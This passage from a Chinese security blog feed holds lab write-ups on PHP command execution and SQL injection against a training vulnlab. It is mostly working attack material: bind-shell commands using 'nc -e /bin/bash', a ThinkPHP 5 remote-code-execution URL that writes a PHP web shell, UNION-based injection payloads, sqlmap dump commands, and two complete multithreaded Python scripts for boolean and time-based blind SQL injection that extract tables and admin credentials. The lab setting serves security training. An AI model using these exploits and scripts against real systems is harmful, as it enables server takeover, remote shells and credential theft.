<h4 id="f-eval"><a href="#f-eval" class="headerlink" title="f.eval"></a>f.eval</h4><p>eval ( string $code )</p>
<p>直接shell。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">system</span><span class="params">(<span class="string">'nc -lvp 31321 -e /bin/bash'</span>)</span></span></span><br></pre></td></tr></table></figure>

<p>连接发现失败。查手册发现eval里的代码必须为PHP代码，且以分号结尾。</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">system('nc -lvp <span class="number">3132</span>1 -e /bin/bash');</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426183223748.png" alt="image-20200426183223748"></p>
<p>成功反弹shell。</p>
<h4 id="g-preg-replace"><a href="#g-preg-replace" class="headerlink" title="g preg_replace"></a>g preg_replace</h4><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, <span class="built_in">int</span> $limit = <span class="number">-1</span> [, <span class="built_in">int</span> &amp;$count ]] )</span><br></pre></td></tr></table></figure>

<p>直接cmd=phpinfo();</p>
<p><img src="/assets/image-20200426183515204.png" alt="image-20200426183515204"></p>
<p>反弹shell。</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">system('nc -lvp <span class="number">3132</span>2 -e /bin/bash');</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426183623281.png" alt="image-20200426183623281"></p>
<h4 id="h-preg-replace2"><a href="#h-preg-replace2" class="headerlink" title="h preg_replace2"></a>h preg_replace2</h4><p>可以在双引号中使用</p>
<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">&#123;$&#123;代码&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>来执行代码</p>
<p>只能列出目录，</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="link">http://47.105.75.177/owasp/vulnlab/exec/code/preg_replace_2.php?data=</span>[<span class="string">php</span>]&#123;$&#123;system(ls)&#125;&#125;[/php]</span><br></pre></td></tr></table></figure>



<p>正向shell出问题了。</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="link">http://47.105.75.177/owasp/vulnlab/exec/code/preg_replace_2.php?data=</span>[<span class="string">php</span>]&#123;$&#123;system(<span class="emphasis">'nc -lvp 31322 -e /bin/bash'</span>)&#125;&#125;[/php]</span><br></pre></td></tr></table></figure>



<h3 id="F-sys"><a href="#F-sys" class="headerlink" title="F.sys"></a>F.sys</h3><p>由于题目较多，所以只进行简单的测试。</p>
<ul>
<li><p>com 500错误</p>
</li>
<li><p>exec ls</p>
</li>
<li><p>exec_l ls       发现会以数组的形式返回。</p>
</li>
<li><p>fyh ls</p>
</li>
<li><p>passthru  ls -a</p>
</li>
<li><p>popen ls</p>
</li>
<li><p>popen_l ls 没反应。此题不会。。。</p>
</li>
<li><p>shell_exec ls</p>
</li>
<li><p>system  ls  </p>
</li>
</ul>
<h3 id="G-ThinkPHP-V5框架漏洞"><a href="#G-ThinkPHP-V5框架漏洞" class="headerlink" title="G.ThinkPHP V5框架漏洞"></a>G.ThinkPHP V5框架漏洞</h3><p>首先用dirsearch扫描，</p>
<p><img src="/assets/image-20200426185546367.png" alt="image-20200426185546367"></p>
<p><img src="/assets/image-20200426185648640.png" alt="image-20200426185648640"></p>
<p>发现个关键文件README.md，wget下载后发现是5.0版本的ThinkPHP.当然也可以随便输入文件报错看版本：v5.0.22.</p>
<p>可以用云悉探测。</p>
<p>搜索历史漏洞。ThinkPHP命令执行漏洞，其影响范围：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ThinkPHP <span class="number">5.0</span>系列 &lt;<span class="number">5.0</span><span class="number">.23</span>，ThinkPHP <span class="number">5.1</span>系列&lt; <span class="number">5.1</span><span class="number">.31</span>，以及基于ThinkPHP5二次开发的CMS，如AdminLTE后台管理系统、Thinkcmf、ThinkSNS等。</span><br></pre></td></tr></table></figure>

<p>所以直接利用</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">index</span>.php?s=/<span class="keyword">index</span>/\think\request/<span class="keyword">cache</span>&amp;key=<span class="number">1</span>|phpinfo</span><br></pre></td></tr></table></figure>

<p>发现不成功。</p>
<p>利用网上的Poc</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=id</span><br></pre></td></tr></table></figure>

<p>利用成功</p>
<p><img src="/assets/image-20200426190132905.png" alt="image-20200426190132905"></p>
<p>正确写shell姿势</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="link">http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="string">0</span>]=system&amp;vars[1][]=echo ^&lt;?php @eval($<span class="emphasis">_GET["code"])?^&gt;&gt;shell.php</span></span><br></pre></td></tr></table></figure>

<p>尝试正向shell。</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=nc -lvp 31328 -e /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426190529727.png" alt="image-20200426190529727"></p>
<p>正向shell成功。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>合天培训_实验_sql注入</title>
    <url>/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>本文主要描述了SQL注入的几种类型，以及使用sqlmap如何对这几种类型进行注入。</p>
<a id="more"></a>

<h2 id="1-数字型注入"><a href="#1-数字型注入" class="headerlink" title="1.数字型注入"></a>1.数字型注入</h2><p>直接用sqlmap</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1</span><br><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 –dbs  #列数据库信息</span><br><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 --current-db 查看当前使用的数据库</span><br><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 -D hetianlab --tables   #查看数据库下的表名</span><br><span class="line"></span><br><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 -D hetianlab -T user --columns</span><br><span class="line"></span><br><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 -D hetianlab -T user --columns --dump</span><br></pre></td></tr></table></figure>

<p>手工注入：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="number">-1</span> union select <span class="number">1</span>,<span class="number">2</span>,database()</span><br><span class="line"><span class="number">-1</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database()</span><br><span class="line"><span class="number">-1</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database()</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,group_concat(column_name)%<span class="number">20f</span>rom%<span class="number">20</span>information_schema.columns%<span class="number">20</span>where%<span class="number">20</span>table_schema=database()%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>table_name=%<span class="number">27</span>user%<span class="number">27</span></span><br><span class="line"><span class="number">-1</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,username,password%<span class="number">20f</span>rom%<span class="number">20</span>user</span><br></pre></td></tr></table></figure>

<p>得到账户名：admin 密码： 21232f297a57a5a743894a0e4a801fc3</p>
<h2 id="2-字符型注入"><a href="#2-字符型注入" class="headerlink" title="2.字符型注入"></a>2.字符型注入</h2><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="string">' 报错</span></span><br><span class="line"><span class="string">'</span><span class="meta">%</span><span class="number">23</span> 正确</span><br></pre></td></tr></table></figure>

<p>猜测为字符型注入。</p>
<p>爆库</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> %<span class="number">23</span></span><br><span class="line"><span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,database() %<span class="number">23</span></span><br><span class="line"><span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database() %<span class="number">23</span></span><br><span class="line"><span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database() %<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span>'%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,group_concat(column_name)%<span class="number">20</span>from%<span class="number">20</span>information_schema.columns%<span class="number">20</span>where%<span class="number">20</span>table_schema=database()%<span class="number">20</span>and%<span class="number">20</span>table_name=%<span class="number">27</span>user%<span class="number">27</span> %<span class="number">23</span></span><br><span class="line"><span class="number">-1</span>'%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,username,password%<span class="number">20</span>from%<span class="number">20</span>user %<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>得到账户名：admin 密码： 21232f297a57a5a743894a0e4a801fc3</p>
<h2 id="3-布尔盲注"><a href="#3-布尔盲注" class="headerlink" title="3.布尔盲注"></a>3.布尔盲注</h2><p>（1）判断类型</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>' 不显示结果</span><br><span class="line"><span class="number">1</span>%<span class="number">27</span>%<span class="number">23</span> 正确  you are in</span><br></pre></td></tr></table></figure>

<p>根据方法判断是盲注</p>
<p>根据http response看出是布尔型</p>
<p>（2）列数</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>' order by <span class="number">5</span> % <span class="number">23</span> 二分爆出列数<span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>（3）脚本爆表：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">"http://47.105.75.177/vulnlab/sqli/index2.php?id=1"</span></span><br><span class="line">target_url=<span class="string">"&#123;url&#125;' and &#123;payload&#125;%23"</span></span><br><span class="line">string_set = string.printable+<span class="string">',_'</span></span><br><span class="line"><span class="comment">#判断条件可以选择length,substr,regexp,left等函数</span></span><br><span class="line">value_statement=<span class="string">'(select (select ascii(substr(&#123;column_name&#125;,&#123;index&#125;,1)) from &#123;table_name&#125; where &#123;where_statement&#125;) &#123;symbol&#125; &#123;ascii_number&#125;) '</span></span><br><span class="line">length_statement=<span class="string">'(select (select length(&#123;column_name&#125;) from &#123;table_name&#125; where &#123;where_statement&#125;) &#123;symbol&#125; &#123;number&#125;) '</span></span><br><span class="line">MAX_LEN = <span class="number">10000</span></span><br><span class="line">ASCII_MAX = <span class="number">128</span></span><br><span class="line">TRUE_FLAG=<span class="string">"You are in"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,begin,end,column_name,table_name,where_statement)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.begin = begin</span><br><span class="line">        self.end = end</span><br><span class="line">        self.value = <span class="string">''</span></span><br><span class="line">        self.column_name = column_name</span><br><span class="line">        self.table_name = table_name</span><br><span class="line">        self.where_statement = where_statement</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        value = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> cur_index <span class="keyword">in</span> range(self.begin,self.end+<span class="number">1</span>):</span><br><span class="line">            begin = <span class="number">0</span></span><br><span class="line">            end = ASCII_MAX</span><br><span class="line">            <span class="keyword">while</span> begin &lt;= end:</span><br><span class="line">                mid = (begin+end)//<span class="number">2</span></span><br><span class="line">                payload=value_statement.format(column_name=self.column_name,index=cur_index,table_name=self.table_name,where_statement=self.where_statement,symbol=<span class="string">'='</span>,ascii_number=mid)</span><br><span class="line">                <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">                    begin = mid </span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                payload=value_statement.format(column_name=self.column_name,index=cur_index,table_name=self.table_name,where_statement=self.where_statement,symbol=<span class="string">'&gt;'</span>,ascii_number=mid)</span><br><span class="line">                <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">                    begin = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    end = mid - <span class="number">1</span></span><br><span class="line">            value += chr(begin)</span><br><span class="line">            <span class="comment">#print("value:%s"%value)</span></span><br><span class="line">        self.value = value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_result</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">selectIsTrue</span><span class="params">(payload)</span>:</span></span><br><span class="line">    <span class="comment">#print("url:"+target_url.format(url=url,payload=payload))</span></span><br><span class="line">    content = requests.get(target_url.format(url=url,payload=payload)).content.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    <span class="keyword">if</span> TRUE_FLAG <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_len</span><span class="params">(column_name,table_name,where_statement)</span>:</span> </span><br><span class="line">    begin=<span class="number">0</span></span><br><span class="line">    end=MAX_LEN</span><br><span class="line">    <span class="keyword">while</span> begin &lt;= end:</span><br><span class="line">        mid = (begin+end)//<span class="number">2</span></span><br><span class="line">        payload=length_statement.format(column_name=column_name,table_name=table_name,where_statement=where_statement,symbol=<span class="string">'='</span>,number=mid)</span><br><span class="line">        <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">            begin = mid</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload=length_statement.format(column_name=column_name,table_name=table_name,where_statement=where_statement,symbol=<span class="string">'&gt;'</span>,number=mid)</span><br><span class="line">        <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">            begin = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = mid - <span class="number">1</span></span><br><span class="line">    length = begin</span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line">Thread_Nums=<span class="number">10</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_value</span><span class="params">(column_name,table_name,where_statement,length)</span>:</span></span><br><span class="line">    value = <span class="string">''</span></span><br><span class="line">    thread_lists = []</span><br><span class="line">    task_num = length//Thread_Nums</span><br><span class="line">    <span class="keyword">if</span> length &gt;= Thread_Nums:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>,task_num):</span><br><span class="line">            cur_thread = MyThread(i,i+task_num<span class="number">-1</span>,column_name,table_name,where_statement)</span><br><span class="line">            thread_lists.append(cur_thread)</span><br><span class="line">            cur_thread.start()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cur_thread = MyThread(<span class="number">1</span>,length,column_name,table_name,where_statement)</span><br><span class="line">        thread_lists.append(cur_thread)</span><br><span class="line">        cur_thread.start()</span><br><span class="line">    <span class="keyword">for</span> cur_thread <span class="keyword">in</span> thread_lists:</span><br><span class="line">        cur_thread.join()</span><br><span class="line">        value += cur_thread.get_result()</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    column_name=<span class="string">"group_concat(table_name)"</span></span><br><span class="line">    table_name=<span class="string">"information_schema.tables"</span></span><br><span class="line">    where_statement=<span class="string">"table_schema=database()"</span></span><br><span class="line">    <span class="comment">#判断表长度</span></span><br><span class="line">    all_table_name_len = get_len(column_name,table_name,where_statement)</span><br><span class="line">    print(<span class="string">"all_table_name_len:%s"</span>%all_table_name_len)</span><br><span class="line">    <span class="comment">#找表名</span></span><br><span class="line">    all_table_name = get_value(column_name,table_name,where_statement,all_table_name_len)</span><br><span class="line">    print(<span class="string">"all_table_name:%s"</span>%all_table_name)</span><br><span class="line">    <span class="comment">#comment,comments,emails,referers,string,user,user</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#判断列长度</span></span><br><span class="line">    column_name=<span class="string">"group_concat(column_name)"</span></span><br><span class="line">    table_name=<span class="string">"information_schema.columns"</span></span><br><span class="line">    t_name = input(<span class="string">"输入要查询的表名\n"</span>)</span><br><span class="line">    where_statement=<span class="string">"table_schema=database() and table_name='&#123;t_name&#125;'"</span>.format(t_name=t_name)</span><br><span class="line">    all_column_name_len = get_len(column_name,table_name,where_statement)</span><br><span class="line">    print(<span class="string">"all_column_name_len:%s"</span>%all_column_name_len)</span><br><span class="line">    all_column_name = get_value(column_name,table_name,where_statement,all_column_name_len)</span><br><span class="line">    print(<span class="string">"all_column_name:%s"</span>%all_column_name)</span><br><span class="line"></span><br><span class="line">    c_names = input(<span class="string">"输入所有要查询的字段,以逗号分开\n"</span>).split(<span class="string">','</span>)</span><br><span class="line">    <span class="keyword">for</span> c_name <span class="keyword">in</span> c_names:</span><br><span class="line">        column_name=<span class="string">"group_concat(&#123;column_name&#125;)"</span>.format(column_name=c_name)</span><br><span class="line">        table_name=t_name</span><br><span class="line">        where_statement = <span class="string">"1"</span></span><br><span class="line">        all_value_len = get_len(column_name,table_name,where_statement)</span><br><span class="line">        print(<span class="string">"%s_length:%s"</span>%(c_name,all_value_len))</span><br><span class="line">        all_value = get_value(column_name,table_name,where_statement,all_value_len)</span><br><span class="line">        print(<span class="string">"%s_value:%s"</span>%(c_name,all_value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>username:admin password:21232f297a57a5a743894a0e4a801fc3</p>
<p>或者直接sqlmap</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index2.php?id=1"</span> -technique B --dbs</span><br><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index2.php?id=1"</span> -technique B -D hetianlab --tables</span><br><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index2.php?id=1"</span> -technique B -D hetianlab -T<span class="built_in"> user </span>--columns</span><br><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index2.php?id=1"</span> -technique B -D hetianlab -T<span class="built_in"> user </span>--dump</span><br></pre></td></tr></table></figure>



<h2 id="4-时间盲注"><a href="#4-时间盲注" class="headerlink" title="4.时间盲注"></a>4.时间盲注</h2><p>尝试</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">id=<span class="number">1</span>' and sleep(<span class="number">3</span>) %<span class="number">23</span>   <span class="comment">//where 语句里面可以用sleep函数。</span></span><br></pre></td></tr></table></figure>

<p>发现时间延长。</p>
<p>所以可以直接用脚本爆破：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">"http://47.105.75.177/vulnlab/sqli/index3.php?id=1"</span></span><br><span class="line">target_url=<span class="string">"&#123;url&#125;' and &#123;payload&#125;%23"</span></span><br><span class="line">string_set = string.printable+<span class="string">',_'</span></span><br><span class="line"><span class="comment">#判断条件可以选择length,substr,regexp,left等函数</span></span><br><span class="line">Sleep_Function=<span class="string">"sleep(3)"</span></span><br><span class="line">value_statement=<span class="string">'if ((select (select ascii(substr(&#123;column_name&#125;,&#123;index&#125;,1)) from &#123;table_name&#125; where &#123;where_statement&#125;) &#123;symbol&#125; &#123;ascii_number&#125;),'</span>+Sleep_Function+<span class="string">",1)"</span></span><br><span class="line">length_statement=<span class="string">'if ((select (select length(&#123;column_name&#125;) from &#123;table_name&#125; where &#123;where_statement&#125;) &#123;symbol&#125; &#123;number&#125;),'</span> + Sleep_Function+<span class="string">',1)'</span></span><br><span class="line">MAX_LEN = <span class="number">10000</span></span><br><span class="line">ASCII_MAX = <span class="number">128</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,begin,end,column_name,table_name,where_statement)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.begin = begin</span><br><span class="line">        self.end = end</span><br><span class="line">        self.value = <span class="string">''</span></span><br><span class="line">        self.column_name = column_name</span><br><span class="line">        self.table_name = table_name</span><br><span class="line">        self.where_statement = where_statement</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        value = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> cur_index <span class="keyword">in</span> range(self.begin,self.end+<span class="number">1</span>):</span><br><span class="line">            begin = <span class="number">0</span></span><br><span class="line">            end = ASCII_MAX</span><br><span class="line">            <span class="keyword">while</span> begin &lt;= end:</span><br><span class="line">                mid = (begin+end)//<span class="number">2</span></span><br><span class="line">                payload=value_statement.format(column_name=self.column_name,index=cur_index,table_name=self.table_name,where_statement=self.where_statement,symbol=<span class="string">'='</span>,ascii_number=mid)</span><br><span class="line">                <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">                    begin = mid </span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                payload=value_statement.format(column_name=self.column_name,index=cur_index,table_name=self.table_name,where_statement=self.where_statement,symbol=<span class="string">'&gt;'</span>,ascii_number=mid)</span><br><span class="line">                <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">                    begin = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    end = mid - <span class="number">1</span></span><br><span class="line">            value += chr(begin)</span><br><span class="line">            <span class="comment">#print("value:%s"%value)</span></span><br><span class="line">        self.value = value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_result</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">selectIsTrue</span><span class="params">(payload)</span>:</span></span><br><span class="line">    <span class="comment">#print("url:"+target_url.format(url=url,payload=payload))</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        content = requests.get(target_url.format(url=url,payload=payload),timeout=<span class="number">1</span>).content</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_len</span><span class="params">(column_name,table_name,where_statement)</span>:</span> </span><br><span class="line">    begin=<span class="number">0</span></span><br><span class="line">    end=MAX_LEN</span><br><span class="line">    <span class="keyword">while</span> begin &lt;= end:</span><br><span class="line">        mid = (begin+end)//<span class="number">2</span></span><br><span class="line">        payload=length_statement.format(column_name=column_name,table_name=table_name,where_statement=where_statement,symbol=<span class="string">'='</span>,number=mid)</span><br><span class="line">        <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">            begin = mid</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload=length_statement.format(column_name=column_name,table_name=table_name,where_statement=where_statement,symbol=<span class="string">'&gt;'</span>,number=mid)</span><br><span class="line">        <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">            begin = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = mid - <span class="number">1</span></span><br><span class="line">    length = begin</span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line">Thread_Nums=<span class="number">10</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_value</span><span class="params">(column_name,table_name,where_statement,length)</span>:</span></span><br><span class="line">    value = <span class="string">''</span></span><br><span class="line">    thread_lists = []</span><br><span class="line">    task_num = length//Thread_Nums</span><br><span class="line">    <span class="keyword">if</span> length &gt;= Thread_Nums:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>,task_num):</span><br><span class="line">            cur_thread = MyThread(i,i+task_num<span class="number">-1</span>,column_name,table_name,where_statement)</span><br><span class="line">            thread_lists.append(cur_thread)</span><br><span class="line">            cur_thread.start()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cur_thread = MyThread(<span class="number">1</span>,length,column_name,table_name,where_statement)</span><br><span class="line">        thread_lists.append(cur_thread)</span><br><span class="line">        cur_thread.start()</span><br><span class="line">    <span class="keyword">for</span> cur_thread <span class="keyword">in</span> thread_lists:</span><br><span class="line">        cur_thread.join()</span><br><span class="line">        value += cur_thread.get_result()</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    column_name=<span class="string">"group_concat(table_name)"</span></span><br><span class="line">    table_name=<span class="string">"information_schema.tables"</span></span><br><span class="line">    where_statement=<span class="string">"table_schema=database()"</span></span><br><span class="line">    <span class="comment">#判断表长度</span></span><br><span class="line">    all_table_name_len = get_len(column_name,table_name,where_statement)</span><br><span class="line">    print(<span class="string">"all_table_name_len:%s"</span>%all_table_name_len)</span><br><span class="line">    <span class="comment">#找表名</span></span><br><span class="line">    all_table_name = get_value(column_name,table_name,where_statement,all_table_name_len)</span><br><span class="line">    print(<span class="string">"all_table_name:%s"</span>%all_table_name)</span><br><span class="line">    <span class="comment">#comment,comments,emails,referers,string,user,user</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#判断列长度</span></span><br><span class="line">    column_name=<span class="string">"group_concat(column_name)"</span></span><br><span class="line">    table_name=<span class="string">"information_schema.columns"</span></span><br><span class="line">    t_name = input(<span class="string">"输入要查询的表名\n"</span>)</span><br><span class="line">    where_statement=<span class="string">"table_schema=database() and table_name='&#123;t_name&#125;'"</span>.format(t_name=t_name)</span><br><span class="line">    all_column_name_len = get_len(column_name,table_name,where_statement)</span><br><span class="line">    print(<span class="string">"all_column_name_len:%s"</span>%all_column_name_len)</span><br><span class="line">    all_column_name = get_value(column_name,table_name,where_statement,all_column_name_len)</span><br><span class="line">    print(<span class="string">"all_column_name:%s"</span>%all_column_name)</span><br><span class="line"></span><br><span class="line">    c_names = input(<span class="string">"输入所有要查询的字段,以逗号分开\n"</span>).split(<span class="string">','</span>)</span><br><span class="line">    <span class="keyword">for</span> c_name <span class="keyword">in</span> c_names:</span><br><span class="line">        column_name=<span class="string">"group_concat(&#123;column_name&#125;)"</span>.format(column_name=c_name)</span><br><span class="line">        table_name=t_name</span><br><span class="line">        where_statement = <span class="string">"1"</span></span><br><span class="line">        all_value_len = get_len(column_name,table_name,where_statement)</span><br><span class="line">        print(<span class="string">"%s_length:%s"</span>%(c_name,all_value_len))</span><br><span class="line">        all_value = get_value(column_name,table_name,where_statement,all_value_len)</span><br><span class="line">        print(<span class="string">"%s_value:%s"</span>%(c_name,all_value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>username:admin password:21232f297a57a5a743894a0e4a801fc3</p>
<p>或者直接sqlmap</p>
